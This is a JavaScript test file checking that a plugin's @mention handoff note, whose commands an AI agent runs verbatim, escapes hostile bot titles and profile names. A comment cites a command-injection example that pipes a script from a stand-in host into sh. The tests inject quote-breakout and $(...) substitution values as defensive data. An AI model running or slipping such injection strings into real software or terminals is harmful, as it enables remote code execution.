import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync, chmodSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import test from 'node:test'
import vm from 'node:vm'

// The @mention middleware appends a handoff note whose commands the active
// agent runs verbatim in its terminal. The sender display name and @handle
// used to be interpolated into the double-quoted -q argument (and the
// recipient name sat unquoted after -p) with no escaping — a bot title
// like `x" ; curl evil.sh | sh ; echo "` (titles are free text and sync from
// ui_meta, i.e. other machines / the gateway) broke out into real commands,
// and $(...) inside double quotes expanded even without a breakout. Same
// class as the delegated-routine fix for #21. The middleware's handoff note
// emits a hermes chat command whose every value must stay shell-literal.

const pluginSource = readFileSync(new URL('../plugin.js', import.meta.url), 'utf8')

function load({ activeProfile = 'research', profiles = ['research', 'ops'], title = null } = {}) {
  const values = new Map()
  const atom = initial => {
    const slot = { get: () => values.get(slot), set: value => values.set(slot, value) }
    values.set(slot, initial)
    return slot
  }
  const context = {
    atom,
    PALETTE_AREA: 'palette',
    COMPOSER_AREAS: { middleware: 'middleware' },
    document: { getElementById: () => null, createElement: () => ({}), head: { appendChild: () => undefined } },
    host: {
      request: async method => {
        if (method === 'profiles.list') {
          return { profiles: profiles.map(name => ({ name })) }
        }
        return {}
      },
      state: { profile: { get: () => activeProfile, listen: () => undefined }, gateway: { listen: () => undefined } }
    }
  }
  const source = pluginSource
    .replace(/^import\s+\*\s+as\s+sdk\s+from '@hermes\/plugin-sdk'\r?\n/m, '')
    .replace(/^import\s+\{[\s\S]*?\}\s+from '@hermes\/plugin-sdk'\r?\n/m, '')
    .replace(/^const \{ McpTab, ToolsetConfigPanel \} = sdk\r?\n/m, '')
    .replace(/^import .* from 'react'\r?\n/m, '')
    .replace(/^import .* from 'react\/jsx-runtime'\r?\n/m, '')
    .replace('export default {', 'globalThis.plugin = {')
    .concat('\nglobalThis.__mention = { $botMeta };\n')
  vm.runInNewContext(source, context, { filename: 'plugin.js' })
  context.__mention.$botMeta.set(title ? { [activeProfile]: { title } } : {})

  const registered = []
  context.plugin.register({ storage: { get: () => null }, register: entry => registered.push(entry) })
  const middleware = registered.find(entry => entry.id === 'mention-middleware')
  assert.ok(middleware, 'mention middleware did not register')
  return { handler: middleware.data.handler }
}

/** Run the REAL handoff commands in the note (the hermes chat command — not
 *  the recovery documentation) under stubs that echo each argv element,
 *  proving the shell received the interpolations as LITERALS. */
function runCommands(noteText) {
  const commands = [...noteText.matchAll(/`([^`\n]+)`/g)]
    .map(m => m[1])
    .filter(c => c.startsWith('hermes -p ') && c.includes('chat --in ~'))
  assert.ok(commands.length >= 1, 'expected a hermes handoff command')
  // sh refuses function names with hyphens, so stub the command as an
  // executable on PATH (dash + bash both resolve these before any user bin).
  const stubDir = mkdtempSync(join(tmpdir(), 'handoff-stub-'))
  try {
    const stub = join(stubDir, 'hermes')
    writeFileSync(stub, '#!/bin/sh\nprintf "%s\\037" "$@"\n')
    chmodSync(stub, 0o755)
    const results = []
    for (const command of commands) {
      const script = `PATH=${stubDir}:$PATH\n${command}`
      const result = spawnSync('sh', ['-c', script], { encoding: 'utf8' })
      assert.equal(result.status, 0, `command failed (${result.status}): ${command}\n${result.stderr}`)
      results.push(result.stdout.split('\x1f').slice(0, -1))
    }
    return results
  } finally {
    rmSync(stubDir, { recursive: true, force: true })
  }
}

test('security: a poisoned bot title never reaches any handoff command', async () => {
  const quoteSentinel = `/tmp/hermes-bot-mode-mention-quote-${process.pid}`
  const subSentinel = `/tmp/hermes-bot-mode-mention-sub-${process.pid}`
  rmSync(quoteSentinel, { force: true })
  rmSync(subSentinel, { force: true })

  const title = `Evil" ; touch ${quoteSentinel} ; echo "$(touch ${subSentinel})"`
  const { handler } = load({ title })

  const result = await handler({ text: 'please @ops review the diff' })
  assert.ok(result.text.includes('[@mention handoff'))

  // The poisoned title must not appear inside any command the agent runs —
  // only the profile handle reaches a command, never the free-text title.
  const commandText = [...result.text.matchAll(/`([^`\n]+)`/g)].map(m => m[1]).join('\n')
  assert.ok(!commandText.includes(title))

  for (const args of runCommands(result.text)) {
    assert.ok(!args.some(a => a.includes('Evil')))
    assert.ok(!args.some(a => a.includes(quoteSentinel) || a.includes(subSentinel)))
  }
  assert.equal(existsSync(quoteSentinel), false)
  assert.equal(existsSync(subSentinel), false)
})

test('security: a hostile active profile name stays literal in every handoff command', async () => {
  const sentinel = `/tmp/hbmmention${process.pid}`
  rmSync(sentinel, { force: true })
  const activeProfile = `res$(touch ${sentinel})earch`

  const { handler } = load({ activeProfile, title: null })
  const result = await handler({ text: 'ask @ops to summarize' })

  for (const args of runCommands(result.text)) {
    // The hostile name arrives as a literal argv element — never expanded,
    // never unquoted into a second command.
    assert.ok(
      args.some(a => a.includes('res$(touch')),
      `expected the literal profile name in argv: ${JSON.stringify(args)}`
    )
  }
  assert.equal(existsSync(sentinel), false)
})

test('regression: the handoff command quotes the recipient and sender arguments', async () => {
  const { handler } = load()
  const result = await handler({ text: 'ping @ops please' })

  // The hermes command quotes the -p recipient and shell-escapes the sender.
  assert.match(result.text, /`hermes -p 'ops' chat --in ~ -c "Bot Chat" -Q -q "Message from 🤖 research \(@research\): <your composed message>"`/)
})
